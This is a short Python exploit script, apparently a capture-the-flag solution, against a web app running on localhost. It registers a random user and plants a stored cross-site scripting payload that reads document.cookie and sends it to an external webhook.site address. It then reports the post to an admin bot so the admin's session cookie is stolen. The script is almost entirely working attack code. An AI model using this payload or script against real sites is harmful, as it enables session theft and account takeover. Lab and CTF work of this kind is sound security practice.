#! /usr/bin/python3
import requests
import bs4
import random
import string
from sys import argv
import os

HOST = os.getenv("HOST", "localhost") 
PORT = 42691
BASEURL = f"http://{HOST}:{PORT}"
MYSITE = argv[1] if len(argv) > 1 else "https://webhook.site/d7ea2666-7e4b-420c-9039-bfc625f0e95e"


def do_login(session: requests.Session):
    AUTH = {
        "username": ''.join(random.choice(string.ascii_letters) for i in range(16)),
        "password": ''.join(random.choice(string.ascii_letters) for i in range(16))}
    resp = session.post(
        f"{BASEURL}/register",
        data=AUTH,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)
    resp = session.post(
        f"{BASEURL}/login",
        data=AUTH,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)


def make_post(session: requests.Session):
    TITLE = "Hacked"
    CONTENT = f"<script>fetch(`{MYSITE}?${{document.cookie}}`);</script>"
    resp = session.post(f"{BASEURL}/posts/new",
                        data={"title": TITLE, "content": CONTENT},
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)


def report_to_admin(session: requests.Session):
    myposts = session.get(f"{BASEURL}/posts/view").text
    parser = bs4.BeautifulSoup(myposts, 'html.parser')
    inputs = parser.select("input[name=id]")
    assert len(inputs) > 0
    post_id = inputs[0]['value']
    print(inputs)
    resp = session.post(f"{BASEURL}/posts/share",
                        data={"id": post_id},
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)


with requests.session() as s:
    do_login(s)
    make_post(s)
    report_to_admin(s)
